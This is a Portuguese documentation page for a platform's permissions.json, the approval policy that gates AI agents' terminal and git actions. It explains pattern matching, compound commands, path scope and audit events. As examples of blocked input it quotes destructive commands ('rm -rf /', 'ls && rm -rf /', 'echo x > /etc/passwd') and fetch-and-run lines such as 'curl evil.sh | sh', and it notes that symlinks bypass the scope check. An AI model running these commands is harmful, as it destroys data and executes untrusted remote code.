---
id: permissions
title: Permissões
sidebar_label: Permissões
sidebar_position: 3
description: O formato do permissions.json, como um padrão casa com um comando, e a ordem exata em que a decisão é tomada.
keywords: [permissions.json, aprovação, política, deny, allow, proposed_action]
---

# Permissões

Toda ação com efeito externo nasce como `proposed_action` e passa por aqui
antes de executar. Esta página é o formato e a semântica exata — as regras em
si estão em [Regras de negócio](../business-rules.md#rn-004).

## O arquivo

`permissions.json` fica na **raiz do workspace do projeto** — é um arquivo de
verdade no disco, versionável, não uma coluna no banco.

```json
{
  "allow": ["Terminal(pnpm test:*)", "Terminal(git status)"],
  "deny":  ["Terminal(curl:*)"],
  "ask":   ["GitPush()"]
}
```

Três listas, três significados:

| lista | significa |
|---|---|
| `allow` | `auto_approve` — a ação executa sem perguntar |
| `deny` | `deny` — recusada, e nada reverte isso |
| `ask` | `require_approval` — vai para a fila de aprovação |

Nenhuma lista bate? A ação fica `pending` por default. **A ausência de regra
nunca vira permissão.**

### Com qual credencial a ação auto-aprovada executa

`auto_approve` significa que **ninguém decidiu** — `proposed_actions.decided_by`
fica `NULL`. Isso importa para quem executa: uma ação de git contra provider
remoto precisa de token, e "o token de quem decidiu" não existe neste caminho.

A resposta é o **owner do workspace** ([RN-082](../business-rules.md#rn-082)),
o mesmo da chave de LLM ([RN-058](../business-rules.md#rn-058)) — quem banca a
conta banca os agentes, e isso não muda conforme quem clica.

Vale saber porque a alternativa falha em silêncio: enquanto a api resolvia por
`decided_by`, **toda PR auto-aprovada em repositório remoto morria** com
`Requires authentication`, e só quando um humano clicava em cada uma é que o
caminho funcionava — exatamente a escada que a autonomia existe para evitar.

## O formato do padrão

```
Rótulo(conteúdo)
```

O rótulo é o tipo de ação em PascalCase. O conteúdo só é usado para
`Terminal`; nos outros tipos ele precisa estar **vazio** — `GitPush()` casa
qualquer push, e `GitPush(algo)` não casa nada.

| tipo de ação | rótulo | papel mínimo |
|---|---|---|
| `terminal` | `Terminal` | developer |
| `git_commit` | `GitCommit` | developer |
| `write_file` | `WriteFile` | developer |
| `git_push` | `GitPush` | maintainer |
| `pr_open` | `PrOpen` | maintainer |
| `git_repo_create` | `GitRepoCreate` | maintainer |
| `git_branch_create` | `GitBranchCreate` | maintainer |
| `git_branch_protect` | `GitBranchProtect` | maintainer |
| `open_adr_pr` | `OpenAdrPr` | maintainer |
| `open_infra_pr` | `OpenInfraPr` | maintainer |
| `git_merge` | `GitMerge` | maintainer |
| `instruction_patch` | `InstructionPatch` | maintainer |
| `spend` | `Spend` | **owner** |

O papel mínimo é verificado **antes** do arquivo. Sem ele, `deny` — o
`permissions.json` não consegue conceder o que o IAM nega
([RN-005](../business-rules.md#rn-005)).

## Como um padrão casa com um comando

Não por substring. O comando é tokenizado com regras de shell e o padrão casa
por **prefixo de tokens**:

| padrão | comando | casa? |
|---|---|---|
| `Terminal(pnpm test)` | `pnpm test` | ✅ |
| `Terminal(pnpm test)` | `pnpm test --watch` | ✅ (prefixo) |
| `Terminal(pnpm test)` | `pnpm build` | ❌ |
| `Terminal(pnpm test:*)` | `pnpm test:unit` | ✅ (`*` no fim do token) |
| `Terminal(rm)` | `sudo rm -rf x` | ❌ — `rm` não é o primeiro token |

O `*` vale **dentro de um token**, no fim. Não é glob de caminho: `Terminal(rm
-rf /*)` casa o token literal `/*`, não "qualquer coisa sob `/`".

Variáveis de ambiente são preservadas literalmente: `$HOME` continua `$HOME` no
casamento, em vez de expandir para vazio — expandir mudaria em silêncio o que
está sendo comparado.

## Comando composto

Um comando com `&&`, `;`, `|`, `||` ou `&` é dividido em segmentos, e **cada
segmento é avaliado separadamente**:

- Qualquer segmento em `deny` → o comando inteiro é `deny`.
- **Todos** os segmentos em `allow` → `auto_approve`.
- Qualquer outra combinação → `require_approval`.

**Redirecionamento não é encadeamento.** `>`, `>>` e `<` NÃO quebram segmento:
`cat x 2>/dev/null` é UM comando cujo verbo é `cat`. O alvo do redirecionamento
continua como token do segmento, e por isso `echo x > /etc/passwd` segue sendo
barrado pelo teto de escopo — o que mudou foi o VERBO ficar correto, não o
caminho ficar livre.

`/dev/null`, `/dev/stdin`, `/dev/stdout` e `/dev/stderr` não contam como
caminho de usuário: descartam ou transportam saída, não são arquivo de
ninguém. A lista é essa e não `/dev` inteiro — `/dev/sda` é disco, e continua
fora do escopo.

Isto é deliberado e vale entender: um segmento sem regra nenhuma vira uma
opinião **concreta** de `require_approval`, não silêncio. É o que impede
`pnpm test && curl evil.sh | sh` de ser auto-aprovado porque a primeira metade
estava em `allow`.

## Padrões embutidos

Três padrões são `deny` **sempre**, mesmo sem aparecer no arquivo:

```
Terminal(rm -rf /)
Terminal(rm -rf /*)
Terminal(rm -fr /)
```

Não são uma lista de segurança abrangente — são um piso. A proteção de verdade
vem de `allow` ser explícito e de tudo o mais cair em aprovação.

## O que a ativação da execução semeia

Ativar a execução escreve no `allow` do projeto os padrões de
`DEV_TERMINAL_ALLOW_PATTERNS` (`apps/api/src/domain/actions/dev-terminal-patterns.ts`).
São duas famílias:

- **leitura do próprio worktree** — `ls`, `pwd`, `find`, `cat`, `head`, `tail`,
  `grep`, `wc`, `echo`, `git status`, `git diff`, `git log`;
- **build e teste** — `pnpm install`, `pnpm test`, `npm run`, `npx vitest`,
  `mix test`, `pytest`, `go test`, `cargo test`, entre outros.

A segunda família existe porque `ReportDone` só deixa abrir PR depois de um
`terminal` com `exit 0` no histórico. A primeira existe porque o agente **olha
antes de construir**: sem ela, cada `ls -la` num repositório recém-provisionado
caía em aprovação, voltava como `status pending` — e não como a saída do
comando — e queimava uma iteração do ToolLoop até a task morrer por limite
(ver [RN-068](../business-rules.md#rn-068)).

Isto NÃO afrouxa nada do que está acima. Continua valendo que `deny` vence
`allow`, que os padrões embutidos seguem ativos, que o casamento é por prefixo
de **token** (`ls` liberado não libera `lsof`) e que comando composto exige que
CADA segmento case — então `ls && rm -rf /` não passa por causa do `ls`.

Auto-aprovar `terminal` por `agent_autonomy` seria diferente e não é o que se
faz: liberaria QUALQUER comando dentro do container do engine, sem o arquivo no
meio.

## A ordem completa da decisão

```mermaid
flowchart TD
  A[proposed_action] --> B{papel >= mínimo?}
  B -->|não| D1[deny: IAM insuficiente]
  B -->|sim| C[base: require_approval]
  C --> D{agent_autonomy tem opinião?}
  D -->|deny| D2[deny]
  D -->|outra| E[adota a opinião]
  D -->|nenhuma| E2[mantém a base]
  E --> F{permissions.json casa?}
  E2 --> F
  F -->|deny| D3[deny]
  F -->|allow/ask| G[adota o veredito do arquivo]
  F -->|nenhum| G2[mantém o anterior]
  G --> S{terminal toca caminho<br/>fora da pasta do projeto?}
  G2 --> S
  S -->|sim, e estava auto_approve| I2[TETO: require_approval]
  S -->|não| H{merge em branch protegida<br/>ou instruction_patch?}
  H -->|sim, e estava auto_approve| I[TETO: require_approval]
  H -->|não| J[veredito final]
```

## Escopo de caminho

Um comando de `terminal` é avaliado também por **onde ele toca**, não só pelo
verbo ([ADR 0055](../adr/0055-escopo-de-caminho-na-politica-de-terminal.md),
[RN-075](../business-rules.md#rn-075)). A pasta do projeto —
`<PROJECT_WORKSPACES_ROOT>/<projectId>`, onde vivem o `permissions.json` e todos
os worktrees de agente — é o **escopo**.

A comparação de caminho é **léxica e sem regex sobre a entrada**: o corte de
barras finais é varredura O(n), não `.replace(/\/+$/, '')`. O padrão antigo foi
apontado pelo CodeQL como ReDoS polinomial (HIGH) — ele obriga o motor a tentar
cada posição inicial, e degrada em O(n²) com muitas barras. A entrada aqui vem
de comando de agente, então não é lugar de regex que retrocede.

O escopo faz duas coisas opostas, e é a combinação que importa:

**Aperta.** Um comando que toca caminho de fora nunca é auto-aprovado, por mais
que o verbo esteja em `allow`. Sem isto, `Terminal(cat)` liberado auto-executava
`cat /workspace/apps/engine/lib/engine/actions/git_executor.ex` — o código da
plataforma que executa o agente — e alcançava o worktree de outros projetos.

**Afrouxa.** Dentro do escopo, `cd` deixa de ser um verbo que precisa de
permissão: ele é a própria declaração de escopo. Sem isto, o dev agent, que
emite sempre `cd <caminho> && <verbo>`, esbarrava na regra do comando composto
— todo segmento precisa casar — e **todo** comando parava para aprovação, por
mais que o verbo estivesse liberado.

Três limites que valem entender:

- **Escopo permite, não isenta.** Estar na pasta do projeto não torna
  `curl … | sh` seguro: verbo fora do `allow` continua pedindo aprovação.
- **Fora do escopo é `require_approval`, não `deny`.** O agente pode ter razão
  legítima para olhar fora; quem decide continua sendo você.
- **A normalização é léxica, não `realpath`.** `<raiz>/../..` é resolvido e
  reprovado; um link simbólico dentro do projeto apontando para fora **não** é
  detectado. Escopo é política, não isolamento.

Quais tokens são verificados: os **absolutos** (começam com `/`) e os que
contêm `..`. Um relativo sem `..` resolve sob o `cwd`, que já foi verificado —
e tratar `-maxdepth`, `4` ou `*.ex` como caminho reprovaria comando legítimo
sem ganhar segurança.

Duas propriedades que caem daí:

**`deny` vence na hora.** Não importa em que estágio apareça, retorna
imediatamente. Não existe configuração que reverta um `deny`.

**Um estágio silencioso nunca rebaixa.** Se `agent_autonomy` disse
`auto_approve` e o `permissions.json` não tem regra para aquela ação, o
resultado continua `auto_approve` — o arquivo não "vota contra" por omissão.
Cada estágio só pode subir a permissividade do anterior.

## Os dois tetos

Aplicados **por último**, depois de todo o resto:

| teto | efeito | por quê |
|---|---|---|
| `git_merge` com destino em `dev`, `qa`, `rc` ou `main` | `auto_approve` → `require_approval` | merge em branch protegida é sempre decisão sua ([RN-006](../business-rules.md#rn-006)) |
| `instruction_patch` | `auto_approve` → `require_approval` | você precisa ver o diff antes que um agente mude o comportamento de outro ([RN-007](../business-rules.md#rn-007)) |

Um teto rebaixa `auto_approve` para `require_approval`; ele **não** transforma
`deny` em outra coisa, porque `deny` já teria retornado antes.

:::note Por que `rc` ainda está na lista

O degrau `rc` saiu da política de branches
([ADR 0030](../adr/0030-politica-de-branches-mecanizada.md)) e o bootstrap
parou de criá-lo ([RN-029](../business-rules.md#rn-029)) — mas ele continua
aqui, em `domain/actions/protected-branches.ts`.

Esta lista decide o que a trava de merge **recusa**, e repositórios
bootstrapados por versões anteriores do Brabo ainda têm a branch. Tirá-la daqui
não removeria nada do repositório de ninguém: só tornaria um `git_merge` com
destino em `rc` auto-aprovável, numa branch que alguém pode estar usando como
produção.

Proteger uma branch que não existe não custa nada. Desproteger uma que existe
custa caro — e a assimetria é deliberada.

:::

A diferença entre um teto e um default: o default é o que acontece quando
ninguém configurou nada; o teto é o que acontece **independente** do que foi
configurado.

## O que acontece com o agente enquanto a decisão não vem

Uma ação `pending` não é só uma linha esperando clique: do outro lado há um
agente parado.

Quando a ferramenta que ele chamou fica pendente, o laço dele **suspende**
retendo task, worktree e o histórico da conversa, e ele entra em
`awaiting_approval`. Sua decisão emite `task.action_settled`, que o acorda: o
resultado real do comando ocupa o lugar onde estaria a resposta, e o laço retoma
do ponto em que parou.

**Recusar também responde.** O motivo entra no lugar do resultado, e o agente
aprende que aquele caminho está fechado em vez de esperar para sempre — negar
não o deixa travado.

Isso importa para quem opera: aprovar tarde não desperdiça o trabalho já feito,
e a fila de aprovações não é assíncrona por conveniência — ela é o que o agente
está literalmente esperando. Antes disso, o `pending` voltava como se fosse a
resposta do comando, e o agente gastava o teto de iterações tentando outra coisa
até a task morrer sem uma linha escrita
([RN-073](../business-rules.md#rn-073)).

**Com uma exceção: reinício do engine.** O laço suspenso vive em memória, então
um restart o leva junto. Nesse caso a task **não** fica esperando: ela volta
para a fila bloqueada, com o motivo e origem `infra` no event log, e uma decisão
tomada depois disso não tem mais onde ser aplicada — a ação decidida fica
registrada, mas o turno que a esperava não existe mais. Se você aprovou e nada
aconteceu, é esse o primeiro lugar para olhar.

A auto-aprovação não passa por aqui: ela executa na proposta e o resultado volta
no mesmo turno — que é justamente o valor de ter os padrões da seção anterior.

## O que fica escrito de cada decisão

Toda ação proposta e toda decisão sobre ela viram **evento de domínio** em
`session_events`, com o ator real ([RN-049](../business-rules.md#rn-049)):

| evento | ator | quando |
|---|---|---|
| `proposed_action.created` | o **agente** que propôs | sempre, antes de qualquer execução. `payload.status` diz como a ação nasceu: `pending`, `auto_approved` ou `denied` |
| `proposed_action.approved` | o **usuário** que clicou | só na aprovação manual (inclusive `approve_always`) |
| `proposed_action.denied` | o **usuário** que recusou | com `payload.reason` |
| `action.executed` / `action.failed` | `system` | desfecho da execução |

Daí sai a única forma confiável de separar as duas coisas que este documento
descreve:

- **decisão humana** = contar eventos `proposed_action.approved`;
- **decisão da política** = `proposed_action.created` com
  `status: auto_approved` e ator agente. Ela nunca produz um `.approved`, e por
  isso nunca é confundida com um clique.

Isso não era verdade até a Fase 12e. As três primeiras linhas iam **só para o
outbox**, que é transporte — drenado, marcado com `processed_at` e podado — e a
decisão sobrevivia apenas em `proposed_actions.decided_at`, uma coluna fora da
linha do tempo que a UI, o Psicólogo e a Anamnese leem. O resultado prático foi
que "quantas vezes o humano aprovou" não pôde ser respondido no dogfooding da
Fase 10, que era justamente a métrica principal daquele experimento.

O bootstrap de repositório é a exceção deliberada: as mutações que ele propõe
não emitem `proposed_action.created` no log, porque já são narradas por
`bootstrap.step_*` na mesma sessão — contá-las de novo inflaria a métrica de
aprovação com trabalho que ninguém aprovou.
